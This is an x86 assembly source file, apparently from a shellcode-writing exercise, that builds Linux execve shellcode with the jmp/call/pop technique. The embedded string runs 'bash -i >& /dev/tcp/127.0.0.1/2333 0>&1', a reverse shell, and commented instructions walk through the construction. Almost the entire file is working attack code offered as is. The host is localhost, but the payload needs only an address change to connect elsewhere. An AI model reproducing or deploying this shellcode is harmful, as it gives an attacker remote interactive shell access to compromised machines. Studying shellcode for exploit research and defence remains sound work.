.file	"dummy.c"
	.text
.globl function
	.type	function, @function
function:
	pushl	%ebp
	movl	%esp, %ebp

	# This is where we construct our shellcode. In order to work
	# out the total to be disassembled we use: address of string
	# - address of jmp + string.

	jmp	jtoc			# Jump down
jtop:
	# Call execve(). We build the array to be passed to execve()
	# on the stack.

	xorl	%eax,%eax		# Zero %eax
	#popl	%edx			# pop ptr to "bash" to edx
	#popl 	%ebx			# pop ptr to "-c" to ebx
	popl	%esi			# Address of "/bin/sh" now in esi 

	movb	%al,0x32(%esi)		# NULL terminate "bash ...."
	movb	%al,0xa(%esi)		# NULL terminate "-c"
	movb	%al,0x7(%esi)		# NULL terminate /bin/sh	

	pushl	%eax			# Put NULL on the stack
	movl	%esi,%ebx		
	addl	$0xb,%ebx		# Get "bash -i >& /dev/tcp/127.0.0.1/2333 0>&1" address in ebx
	pushl	%ebx			# Put address of "bash ...." on stack
	movl	%esi,%edx
	addl	$0x8,%edx		# Get "-c" address in edx
	pushl	%edx			# Put address of "-c" on stack	
	pushl	%esi			# Put address of "/bin/sh" on stack
	xorl	%eax, %eax		# NULL in %eax
	xorl	%edx, %edx		# NULL in %edx
	movl	%esp,%ecx		# Address of array in %ecx
	movl	%esi,%ebx		# Address of /bin/sh in %ebx
	movb	$0xb,%al		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode and invoke syscall
jtoc:
	call	jtop                    # Go back (pushing return address)
	.string	"/bin/sh,-c,bash -i >& /dev/tcp/127.0.0.1/2333 0>&1" # The string

	popl	%ebp
	ret
	.size	function, .-function
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$8, %esp
	andl	$-16, %esp
	movl	$0, %eax
	addl	$15, %eax
	addl	$15, %eax
	shrl	$4, %eax
	sall	$4, %eax
	subl	%eax, %esp
	call	function
	movl	$0, %eax
	leave
	ret
	.size	main, .-main
	.section	.note.GNU-stack,"",@progbits
	.ident	"GCC: (GNU) 3.4.6"